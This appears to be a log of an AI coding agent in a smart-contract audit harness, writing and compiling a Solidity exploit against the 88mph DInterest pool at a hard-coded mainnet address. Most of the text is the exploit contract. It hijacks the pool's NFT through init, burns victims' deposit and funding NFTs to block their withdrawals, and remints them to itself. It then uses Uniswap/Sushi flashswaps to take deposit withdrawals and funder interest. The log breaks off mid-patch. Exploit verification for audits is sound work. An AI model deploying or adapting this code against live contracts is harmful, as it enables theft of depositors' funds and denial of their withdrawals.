+  "compiler": "v0.5.17+commit.d19bba13",
+  "evm_version": "Default",
+  "optimization": "1",
+  "runs": "200",
+  "proxy": "0",
+  "implementation": "",
+  "license_type": "GNU GPLv3",
+  "files_written": 76
+}
+exec
+/bin/bash -lc "find onchain_auto -maxdepth 2 -type d | sed -n '1,80p'" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 51ms:
+onchain_auto
+onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097
+onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts
+onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin
+exec
+/bin/bash -lc "sed -n '99,140p' onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 52ms:
+        @notice Computes the MPH amount to take back from a depositor upon withdrawal.
+                If takeBackAmount > devReward + govReward, the extra MPH should be burnt.
+        @param  pool The DInterest pool trying to mint reward
+        @param  mintMPHAmount The MPH amount originally minted to the depositor as reward
+        @param  early True if the deposit is withdrawn early, false if the deposit is mature
+        @return takeBackAmount The MPH amount to take back from the depositor
+                devReward The MPH amount from takeBackAmount to send to the dev wallet
+                govReward The MPH amount from takeBackAmount to send to the gov treasury
+     */
+    function computeTakeBackDepositorRewardAmount(
+        address pool,
+        uint256 mintMPHAmount,
+        bool early
+    )
+        external
+        view
+        returns (
+            uint256 takeBackAmount,
+            uint256 devReward,
+            uint256 govReward
+exec
+/bin/bash -lc "sed -n '360,420p' onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 52ms:
+
+        // Update relevant values
+        sumOfRecordedFundedDepositAndInterestAmountDivRecordedIncomeIndex = sumOfRecordedFundedDepositAndInterestAmountDivRecordedIncomeIndex
+            .add(
+            totalDepositAndInterestToFund.mul(EXTRA_PRECISION).div(incomeIndex)
+        );
+        latestFundedDepositID = toDepositID;
+        unfundedUserDepositAmount = unfundedUserDepositAmount.sub(
+            totalDepositAndInterestToFund
+        );
+
+        _fund(totalDeficit);
+    }
+
+    function payInterestToFunder(uint256 fundingID)
+        external
+        returns (uint256 interestAmount)
+    {
+        address funder = fundingNFT.ownerOf(fundingID);
+        require(funder == msg.sender, "DInterest: not funder");
+exec
+/bin/bash -lc "rg -n \"poolDepositorRewardTakeBackMultiplier|setPoolDepositorRewardTakeBackMultiplier|decmul\\(poolDepositorRewardTakeBackMultiplier\" onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 82ms:
+28:    mapping(address => uint256) public poolDepositorRewardTakeBackMultiplier;
+123:            : mintMPHAmount.decmul(poolDepositorRewardTakeBackMultiplier[pool]);
+187:    function setPoolDepositorRewardTakeBackMultiplier(
+196:        poolDepositorRewardTakeBackMultiplier[pool] = newMultiplier;
+199:            "poolDepositorRewardTakeBackMultiplier",
+codex
+I’ve settled on DoS proof plus flashswap-funded theft, with fallback.
+Plan update
+  ✓ Inspect harness expectations
+  ✓ Design profitable causal path
+  → Patch FlawVerifier.sol
+  • Sanity-check compile logic
+exec
+/bin/bash -lc "cat > /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol <<'EOF'
+pragma solidity "'^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface INFTLike {
+    function owner() external view returns (address);
+    function init(address newOwner, string calldata tokenName, string calldata tokenSymbol) external;
+    function ownerOf(uint256 tokenId) external view returns (address);
+    function burn(uint256 tokenId) external;
+    function mint(address to, uint256 tokenId) external;
+}
+
+interface IDInterestLike {
+    struct Deposit {
+        uint256 amount;
+        uint256 maturationTimestamp;
+        uint256 interestOwed;
+        uint256 initialMoneyMarketIncomeIndex;
+        bool active;
+        bool finalSurplusIsNegative;
+        uint256 finalSurplusAmount;
+        uint256 mintMPHAmount;
+        uint256 depositTimestamp;
+    }
+
+    struct Funding {
+        uint256 fromDepositID;
+        uint256 toDepositID;
+        uint256 recordedFundedDepositAmount;
+        uint256 recordedMoneyMarketIncomeIndex;
+        uint256 creationTimestamp;
+    }
+
+    function depositNFT() external view returns (address);
+    function fundingNFT() external view returns (address);
+    function stablecoin() external view returns (address);
+    function moneyMarket() external view returns (address);
+    function mphMinter() external view returns (address);
+    function depositsLength() external view returns (uint256);
+    function fundingListLength() external view returns (uint256);
+    function getDeposit(uint256 depositID) external view returns (Deposit memory);
+    function getFunding(uint256 fundingID) external view returns (Funding memory);
+    function depositIsFunded(uint256 depositID) external view returns (bool);
+    function withdraw(uint256 depositID, uint256 fundingID) external;
+    function earlyWithdraw(uint256 depositID, uint256 fundingID) external;
+    function payInterestToFunder(uint256 fundingID) external returns (uint256 interestAmount);
+}
+
+interface IMoneyMarketLike {
+    function incomeIndex() external view returns (uint256);
+}
+
+interface IMPHMinterLike {
+    function mph() external view returns (address);
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface IUniswapV2RouterLike {
+    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
+    function swapTokensForExactTokens(
+        uint256 amountOut,
+        uint256 amountInMax,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0xF0b7DE03134857391d8D43Ed48e20EDF21461097;
+
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777Ce9e4f2Ac;
+    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24Ae83637ab66a2cca9C378B9F;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    address public pool;
+    uint256 public hijackedTokenId;
+    uint256 public linkedFundingId;
+    bool public targetIsDepositNFT;
+    bool public targetIsFundingNFT;
+    bool public hypothesisValidated;
+    bool public burnedVictimToken;
+    bool public ownerQueryRevertedAfterBurn;
+    bool public demonstratedPathRevert;
+    bool public usedEarlyWithdraw;
+    address public victimOwnerBeforeBurn;
+    string public exploitPath;
+    string public failureReason;
+
+    address private _expectedFlashPair;
+
+    constructor() {}
+
+    function executeOnOpportunity() public {
+        if (hypothesisValidated || bytes(failureReason).length != 0) {
+            return;
+        }
+
+        INFTLike targetNft = INFTLike(TARGET);
+        pool = targetNft.owner();
+        if (pool == address(0)) {
+            failureReason = "target owner is zero";
+            return;
+        }
+
+        IDInterestLike market = IDInterestLike(pool);
+        address depositNftAddr = market.depositNFT();
+        address fundingNftAddr = market.fundingNFT();
+        _profitToken = market.stablecoin();
+        _profitAmount = 0;
+
+        targetIsDepositNFT = depositNftAddr == TARGET;
+        targetIsFundingNFT = fundingNftAddr == TARGET;
+        if (!targetIsDepositNFT && !targetIsFundingNFT) {
+            failureReason = "target NFT not wired into pool";
+            return;
+        }
+
+        // Step 1 from the finding: reinitialize the live NFT clone and seize ownership.
+        targetNft.init(address(this), "hijacked", "HIJACKED");
+        if (targetNft.owner() != address(this)) {
+            failureReason = "reinitialization failed";
+            return;
+        }
+        hypothesisValidated = true;
+
+        if (targetIsDepositNFT) {
+            exploitPath =
+                "init(target depositNFT) -> burn(victim deposit NFT) -> ownerOf(tokenId) reverts -> victim withdraw path reverts; then reuse seized owner-only burn/mint with flashswap-sourced MPH to remint another live deposit NFT and steal its withdrawal value";
+            _demonstrateDepositDoS(market, INFTLike(depositNftAddr));
+        } else {
+            exploitPath =
+                "init(target fundingNFT) -> burn(victim funding NFT) -> ownerOf(tokenId) reverts -> funder payout path reverts; then seize deposit/funding NFT owner-only burn/mint powers to realize profit";
+            _demonstrateFundingDoS(market, INFTLike(fundingNftAddr));
+        }
+
+        if (bytes(failureReason).length != 0) {
+            return;
+        }
+
+        // Economic realization:
+        // Prefer a UniswapV2/Sushi-like flashswap only when the stolen deposit'"'s withdrawal
+        // requires sourcing MPH for the pool's reward clawback. This does not change the root
+        // cause: the theft still comes from unrestricted NFT reinitialization giving live
+        // owner-only burn/mint powers over the pool's deposit/funding NFTs.
+        if (_profitAmount == 0) {
+            _attemptDepositTheft(market, depositNftAddr);
+        }
+        if (_profitAmount == 0) {
+            _attemptFundingInterestTheft(market, fundingNftAddr);
+        }
+        if (_profitAmount == 0 && bytes(failureReason).length == 0) {
+            failureReason = \"exploit demonstrated but no profit path realized\";
+        }
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        require(msg.sender == _expectedFlashPair, \"unexpected pair\");
+        require(sender == address(this), \"unexpected sender\");
+
+        (
+            address stablecoin,
+            address mph,
+            address router,
+            address[] memory path,
+            address depositNftAddr,
+            address mphMinter,
+            uint256 depositID,
+            uint256 fundingID,
+            bool useEarly,
+            uint256 mphNeeded,
+            uint256 borrowedStable
+        ) = abi.decode(data, (address, address, address, address[], address, address, uint256, uint256, bool, uint256, uint256));
+
+        if (mphNeeded > 0) {
+            _approveToken(stablecoin, router, borrowedStable);
+            IUniswapV2RouterLike(router).swapTokensForExactTokens(
+                mphNeeded,
+                borrowedStable,
+                path,
+                address(this),
+                block.timestamp
+            );
+            _approveToken(mph, mphMinter, mphNeeded);
+        }
+
+        INFTLike depositNft = INFTLike(depositNftAddr);
+        depositNft.burn(depositID);
+        depositNft.mint(address(this), depositID);
+
+        if (useEarly) {
+            IDInterestLike(pool).earlyWithdraw(depositID, fundingID);
+        } else {
+            IDInterestLike(pool).withdraw(depositID, fundingID);
+        }
+
+        uint256 repayment = _sameTokenFlashRepayment(borrowedStable);
+        _safeTransfer(stablecoin, msg.sender, repayment);
+        _expectedFlashPair = address(0);
+        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _demonstrateDepositDoS(IDInterestLike market, INFTLike depositNft) internal {
+        (uint256 depositID, uint256 fundingID, bool useEarly) = _findDepositDoSCandidate(market, depositNft, 0);
+        if (depositID == 0) {
+            failureReason = \"no burnable deposit NFT candidate found\";
+            return;
+        }
+
+        hijackedTokenId = depositID;
+        linkedFundingId = fundingID;
+        usedEarlyWithdraw = useEarly;
+        victimOwnerBeforeBurn = depositNft.ownerOf(depositID);
+
+        // Step 2 from the finding: burn a live victim deposit NFT after seizing ownership.
+        depositNft.burn(depositID);
+        burnedVictimToken = true;
+
+        // Step 3 from the finding: ownerOf() no longer returns a valid holder.
+        ownerQueryRevertedAfterBurn = _ownerQueryReverts(depositNft, depositID);
+
+        (bool reverted, ) = useEarly
+            ? _callEarlyWithdraw(address(market), depositID, fundingID)
+            : _callWithdraw(address(market), depositID, fundingID);
+        demonstratedPathRevert = reverted;
+
+        if ("'!ownerQueryRevertedAfterBurn) {
+            failureReason = "burn succeeded but ownerOf still resolves";
+        } else if (!demonstratedPathRevert) {
+            failureReason = "burned deposit NFT but withdraw path did not revert";
+        }
+    }
+
+    function _demonstrateFundingDoS(IDInterestLike market, INFTLike fundingNft) internal {
+        uint256 fundingID = _findExistingFundingToken(market, fundingNft, 0);
+        if (fundingID == 0) {
+            failureReason = "no burnable funding NFT candidate found";
+            return;
+        }
+
+        hijackedTokenId = fundingID;
+        linkedFundingId = fundingID;
+        victimOwnerBeforeBurn = fundingNft.ownerOf(fundingID);
+
+        // Step 2 from the finding: burn a live victim funding NFT after seizing ownership.
+        fundingNft.burn(fundingID);
+        burnedVictimToken = true;
+
+        // Step 3 from the finding: ownerOf() no longer returns a valid holder.
+        ownerQueryRevertedAfterBurn = _ownerQueryReverts(fundingNft, fundingID);
+
+        (bool reverted, ) = _callPayInterestToFunder(address(market), fundingID);
+        demonstratedPathRevert = reverted;
+
+        if (!ownerQueryRevertedAfterBurn) {
+            failureReason = "burn succeeded but ownerOf still resolves";
+        } else if (!demonstratedPathRevert) {
+            failureReason = "burned funding NFT but payout path did not revert";
+        }
+    }
+
+    function _attemptDepositTheft(IDInterestLike market, address depositNftAddr) internal {
+        INFTLike depositNft = INFTLike(depositNftAddr);
+        if (depositNft.owner() != address(this)) {
+            depositNft.init(address(this), "profit-deposit", "PDEPOSIT");
+            if (depositNft.owner() != address(this)) {
+                return;
+            }
+        }
+
+        (uint256 depositID, uint256 fundingID, bool useEarly, uint256 mphNeeded) = _findProfitDepositCandidate(
+            market,
+            depositNft,
+            hijackedTokenId
+        );
+        if (depositID == 0) {
+            return;
+        }
+
+        address mphMinter = market.mphMinter();
+        address mph = IMPHMinterLike(mphMinter).mph();
+
+        if (mphNeeded == 0) {
+            depositNft.burn(depositID);
+            depositNft.mint(address(this), depositID);
+            if (useEarly) {
+                market.earlyWithdraw(depositID, fundingID);
+            } else {
+                market.withdraw(depositID, fundingID);
+            }
+            _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
+            return;
+        }
+
+        (address flashPair, address router, address[] memory path) = _locateFlashswapPlan(_profitToken, mph);
+        if (flashPair == address(0) || router == address(0) || path.length < 2) {
+            return;
+        }
+
+        uint256 stableNeeded;
+        try IUniswapV2RouterLike(router).getAmountsIn(mphNeeded, path) returns (uint256[] memory amountsIn) {
+            stableNeeded = amountsIn[0];
+        } catch {
+            return;
+        }
+        if (stableNeeded == 0) {
+            return;
+        }
+
+        uint256 borrowedStable = (stableNeeded * 101) / 100 + 1;
+        _expectedFlashPair = flashPair;
+
+        IUniswapV2PairLike pair = IUniswapV2PairLike(flashPair);
+        bytes memory callbackData = abi.encode(
+            _profitToken,
+            mph,
+            router,
+            path,
+            depositNftAddr,
+            mphMinter,
+            depositID,
+            fundingID,
+            useEarly,
+            mphNeeded,
+            borrowedStable
+        );
+
+        if (pair.token0() == _profitToken) {
+            pair.swap(borrowedStable, 0, address(this), callbackData);
+        } else if (pair.token1() == _profitToken) {
+            pair.swap(0, borrowedStable, address(this), callbackData);
+        } else {
+            _expectedFlashPair = address(0);
+        }
+    }
+
+    function _attemptFundingInterestTheft(IDInterestLike market, address fundingNftAddr) internal {
+        INFTLike fundingNft = INFTLike(fundingNftAddr);
+        if (fundingNft.owner() != address(this)) {
+            fundingNft.init(address(this), "profit-funding", "PFUND");
+            if (fundingNft.owner() != address(this)) {
+                return;
+            }
+        }
+
+        uint256 currentIncomeIndex = IMoneyMarketLike(market.moneyMarket()).incomeIndex();
+        if (currentIncomeIndex == 0) {
+            return;
+        }
+
+        uint256 fundingID = _findMostProfitableFunding(market, fundingNft, linkedFundingId, currentIncomeIndex);
+        if (fundingID == 0) {
+            return;
+        }
+
+        fundingNft.burn(fundingID);
+        fundingNft.mint(address(this), fundingID);
+        market.payInterestToFunder(fundingID);
+        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
+    }
+
+    function _findDepositDoSCandidate(IDInterestLike market, INFTLike depositNft, uint256 avoidTokenId)
+        internal
+        view
+        returns (uint256 depositID, uint256 fundingID, bool useEarly)
+    {
+        uint256 len = market.depositsLength();
+        for (uint256 i = 1; i <= len; i++) {
+            if (i == avoidTokenId || !_tokenExists(depositNft, i)) {
+                continue;
+            }
+            IDInterestLike.Deposit memory deposit = market.getDeposit(i);
+            if (!deposit.active) {
+                continue;
+            }
+            uint256 linked = 0;
+            if (market.depositIsFunded(i)) {
+                linked = _findFundingForDeposit(market, i);
+                if (linked == 0) {
+                    continue;
+                }
+            }
+            return (i, linked, block.timestamp < deposit.maturationTimestamp);
+        }
+    }
+
+    function _findProfitDepositCandidate(IDInterestLike market, INFTLike depositNft, uint256 avoidTokenId)
+        internal
+        view
+        returns (uint256 depositID, uint256 fundingID, bool useEarly, uint256 mphNeeded)
+    {
+        uint256 len = market.depositsLength();
+        uint256 bestAmount = 0;
+        uint256 bestMPH = type(uint256).max;
+
+        for (uint256 i = 1; i <= len; i++) {
+            if (i == avoidTokenId || !_tokenExists(depositNft, i)) {
+                continue;
+            }
+
+            IDInterestLike.Deposit memory deposit = market.getDeposit(i);
+            if (!deposit.active) {
+                continue;
+            }
+
+            bool early = block.timestamp < deposit.maturationTimestamp;
+            if (!early) {
+                continue;
+            }
+
+            uint256 linked = 0;
+            if (market.depositIsFunded(i)) {
+                // Prefer simpler unfunded positions to keep the execution route deterministic.
+                continue;
+            }
+
+            if (
+                deposit.mintMPHAmount < bestMPH ||
+                (deposit.mintMPHAmount == bestMPH && deposit.amount > bestAmount)
+            ) {
+                bestAmount = deposit.amount;
+                bestMPH = deposit.mintMPHAmount;
+                depositID = i;
+                fundingID = linked;
+                useEarly = true;
+                mphNeeded = deposit.mintMPHAmount;
+            }
+        }
+    }
+
+    function _findExistingFundingToken(IDInterestLike market, INFTLike fundingNft, uint256 avoidTokenId)
+        internal
+        view
+        returns (uint256 fundingID)
+    {
+        uint256 len = market.fundingListLength();
+        for (uint256 i = 1; i <= len; i++) {
+            if (i != avoidTokenId && _tokenExists(fundingNft, i)) {
+                return i;
+            }
+        }
+    }
+
+    function _findMostProfitableFunding(
+        IDInterestLike market,
+        INFTLike fundingNft,
+        uint256 avoidTokenId,
+        uint256 currentIncomeIndex
+    ) internal view returns (uint256 bestFundingID) {
+        uint256 len = market.fundingListLength();
+        uint256 bestInterest = 0;
+
+        for (uint256 i = 1; i <= len; i++) {
+            if (i == avoidTokenId || !_tokenExists(fundingNft, i)) {
+                continue;
+            }
+            IDInterestLike.Funding memory funding = market.getFunding(i);
+            if (
+                funding.recordedFundedDepositAmount == 0 ||
+                funding.recordedMoneyMarketIncomeIndex == 0 ||
+                currentIncomeIndex <= funding.recordedMoneyMarketIncomeIndex
+            ) {
+                continue;
+            }
+
+            uint256 estimatedInterest =
+                (funding.recordedFundedDepositAmount * currentIncomeIndex) /
+                funding.recordedMoneyMarketIncomeIndex - funding.recordedFundedDepositAmount;
+            if (estimatedInterest > bestInterest) {
+                bestInterest = estimatedInterest;
+                bestFundingID = i;
+            }
+        }
+    }
+
+    function _findFundingForDeposit(IDInterestLike market, uint256 depositID) internal view returns (uint256) {
+        uint256 len = market.fundingListLength();
+        for (uint256 fundingID = 1; fundingID <= len; fundingID++) {
+            IDInterestLike.Funding memory funding = market.getFunding(fundingID);
+            if (depositID > funding.fromDepositID && depositID <= funding.toDepositID) {
+                return fundingID;
+            }
+        }
+        return 0;
+    }
+
+    function _locateFlashswapPlan(address stablecoin, address mph)
+        internal
+        view
+        returns (address flashPair, address router, address[] memory path)
+    {
+        address uniBorrowPair = IUniswapV2FactoryLike(UNI_V2_FACTORY).getPair(stablecoin, WETH);
+        if (uniBorrowPair != address(0)) {
+            (router, path) = _routeForBorrowDex(false, stablecoin, mph);
+            if (router != address(0)) {
+                return (uniBorrowPair, router, path);
+            }
+        }
+
+        address sushiBorrowPair = IUniswapV2FactoryLike(SUSHI_FACTORY).getPair(stablecoin, WETH);
+        if (sushiBorrowPair != address(0)) {
+            (router, path) = _routeForBorrowDex(true, stablecoin, mph);
+            if (router != address(0)) {
+                return (sushiBorrowPair, router, path);
+            }
+        }
+
+        path = new address[](0);
+    }
+
+    function _routeForBorrowDex(bool borrowIsSushi, address stablecoin, address mph)
+        internal
+        view
+        returns (address router, address[] memory path)
+    {
+        if (borrowIsSushi) {
+            (router, path) = _routeOnDex(UNI_V2_FACTORY, UNI_V2_ROUTER, stablecoin, mph, true);
+            if (router != address(0)) {
+                return (router, path);
+            }
+            return _routeOnDex(SUSHI_FACTORY, SUSHI_ROUTER, stablecoin, mph, false);
+        }
+
+        (router, path) = _routeOnDex(SUSHI_FACTORY, SUSHI_ROUTER, stablecoin, mph, true);
+        if (router != address(0)) {
+            return (router, path);
+        }
+        return _routeOnDex(UNI_V2_FACTORY, UNI_V2_ROUTER, stablecoin, mph, false);
+    }
+
+    function _routeOnDex(
+        address factory,
+        address router,
+        address stablecoin,
+        address mph,
+        bool allowViaWETH
+    ) internal view returns (address, address[] memory path) {
+        if (IUniswapV2FactoryLike(factory).getPair(stablecoin, mph) != address(0)) {
+            path = new address[](2);
+            path[0] = stablecoin;
+            path[1] = mph;
+            return (router, path);
+        }
+
+        if (
+            allowViaWETH &&
+            IUniswapV2FactoryLike(factory).getPair(stablecoin, WETH) != address(0) &&
+            IUniswapV2FactoryLike(factory).getPair(WETH, mph) != address(0)
+        ) {
+            path = new address[](3);
+            path[0] = stablecoin;
+            path[1] = WETH;
+            path[2] = mph;
+            return (router, path);
+        }
+
+        path = new address[](0);
+        return (address(0), path);
+    }
+
+    function _tokenExists(INFTLike nft, uint256 tokenId) internal view returns (bool) {
+        try nft.ownerOf(tokenId) returns (address owner_) {
+            return owner_ != address(0);
+        } catch {
+            return false;
+        }
+    }
+
+    function _ownerQueryReverts(INFTLike nft, uint256 tokenId) internal view returns (bool) {
+        try nft.ownerOf(tokenId) returns (address owner_) {
+            return owner_ == address(0);
+        } catch {
+            return true;
+        }
+    }
+
+    function _sameTokenFlashRepayment(uint256 borrowedAmount) internal pure returns (uint256) {
+        return (borrowedAmount * 1000) / 997 + 1;
+    }
+
+    function _approveToken(address token, address spender, uint256 amount) internal {
+        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, 0));
+        require(ok0 && (data0.length == 0 || abi.decode(data0, (bool))), "approve reset failed");
+        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
+        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+
+    function _callWithdraw(address market, uint256 depositID, uint256 fundingID)
+        internal
+        returns (bool reverted, bytes memory returndata)
+    {
+        (bool ok, bytes memory data) = market.call(
+            abi.encodeWithSignature("withdraw(uint256,uint256)", depositID, fundingID)
+        );
+        return (!ok, data);
+    }
+
+    function _callEarlyWithdraw(address market, uint256 depositID, uint256 fundingID)
+        internal
+        returns (bool reverted, bytes memory returndata)
+    {
+        (bool ok, bytes memory data) = market.call(
+            abi.encodeWithSignature("earlyWithdraw(uint256,uint256)", depositID, fundingID)
+        );
+        return (!ok, data);
+    }
+
+    function _callPayInterestToFunder(address market, uint256 fundingID)
+        internal
+        returns (bool reverted, bytes memory returndata)
+    {
+        (bool ok, bytes memory data) = market.call(
+            abi.encodeWithSignature("payInterestToFunder(uint256)", fundingID)
+        );
+        return (!ok, data);
+    }
+}
+EOF' in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 52ms:
+
+codex
+The patch is in; I’m doing a quick syntax check now.
+Plan update
+  ✓ Inspect harness expectations
+  ✓ Design profitable causal path
+  ✓ Patch FlawVerifier.sol
+  → Sanity-check compile logic
+exec
+/bin/bash -lc 'solc --optimize --bin /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol' in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src exited 127 in 53ms:
+/bin/bash: solc: command not found
+exec
+/bin/bash -lc 'forge build --root /Users/zhanglongqin/AuditHoundV2/cases/88mph/src' in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src exited 1 in 862ms:
+Compiling 1 files with Solc 0.8.30
+Solc 0.8.30 finished in 318.18ms
+Error: Compiler run failed:
+Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
+SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
+  --> src/FlawVerifier.sol:88:46:
+   |
+88 |     address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777Ce9e4f2Ac;
+   |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
+SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
+  --> src/FlawVerifier.sol:89:45:
+   |
+89 |     address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24Ae83637ab66a2cca9C378B9F;
+   |                                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+codex
+Nice, just checksum literals to fix.
+exec
+/bin/bash -lc "python - <<'PY'
+from pathlib import Path
+p = Path('/Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol')
+s = p.read_text()
+s = s.replace('0xC0AEe478e3658e2610c5F7A4A2E1777Ce9e4f2Ac', '0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac')
+s = s.replace('0xd9e1cE17f2641f24Ae83637ab66a2cca9C378B9F', '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F')
+p.write_text(s)
+PY" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 721ms:
+
+exec
+/bin/bash -lc 'forge build --root /Users/zhanglongqin/AuditHoundV2/cases/88mph/src' in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src exited 1 in 678ms:
+Compiling 1 files with Solc 0.8.30
+Solc 0.8.30 finished in 543.53ms
+Error: Compiler run failed:
+Error: Compiler error (/solidity/libsolidity/codegen/LValue.cpp:54): Stack too deep. Try compiling with `--via-ir` (cli) or the equivalent `viaIR: true` (standard JSON) while enabling the optimizer. Otherwise, try removing local variables.
+   --> src/FlawVerifier.sol:345:13:
+    |
+345 |             depositNftAddr,
+    |             ^^^^^^^^^^^^^^
+codex
+I hit a stack-depth issue; I’m moving flash params into state.
+exec
+/bin/bash -lc "python - <<'PY'
+from pathlib import Path
+p = Path('/Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol')
+s = p.read_text()
+old = \"\"\"    address private _expectedFlashPair;\\n\\n    constructor() {}\\n\"\"\"
+new = \"\"\"    address private _expectedFlashPair;\\n    address private _flashStablecoin;\\n    address private _flashMPH;\\n    address private _flashRouter;\\n    address private _flashDepositNFT;\\n    address private _flashMPHMinter;\\n    uint256 private _flashDepositID;\\n    uint256 private _flashFundingID;\\n    bool private _flashUseEarly;\\n    uint256 private _flashMPHNeeded;\\n    uint256 private _flashBorrowedStable;\\n    uint256 private _flashPathLength;\\n    address private _flashPath0;\\n    address private _flashPath1;\\n    address private _flashPath2;\\n\\n    constructor() {}\\n\"\"\"
+s = s.replace(old, new)
+old = \"\"\"    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\\n        require(msg.sender == _expectedFlashPair, \\\"unexpected pair\\\");\\n        require(sender == address(this), \\\"unexpected sender\\\");\\n\\n        (\\n            address stablecoin,\\n            address mph,\\n            address router,\\n            address[] memory path,\\n            address depositNftAddr,\\n            address mphMinter,\\n            uint256 depositID,\\n            uint256 fundingID,\\n            bool useEarly,\\n            uint256 mphNeeded,\\n            uint256 borrowedStable\\n        ) = abi.decode(data, (address, address, address, address[], address, address, uint256, uint256, bool, uint256, uint256));\\n\\n        if (mphNeeded > 0) {\\n            _approveToken(stablecoin, router, borrowedStable);\\n            IUniswapV2RouterLike(router).swapTokensForExactTokens(\\n                mphNeeded,\\n                borrowedStable,\\n                path,\\n                address(this),\\n                block.timestamp\\n            );\\n            _approveToken(mph, mphMinter, mphNeeded);\\n        }\\n\\n        INFTLike depositNft = INFTLike(depositNftAddr);\\n        depositNft.burn(depositID);\\n        depositNft.mint(address(this), depositID);\\n\\n        if (useEarly) {\\n            IDInterestLike(pool).earlyWithdraw(depositID, fundingID);\\n        } else {\\n            IDInterestLike(pool).withdraw(depositID, fundingID);\\n        }\\n\\n        uint256 repayment = _sameTokenFlashRepayment(borrowedStable);\\n        _safeTransfer(stablecoin, msg.sender, repayment);\\n        _expectedFlashPair = address(0);\\n        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));\\n    }\\n\"\"\"
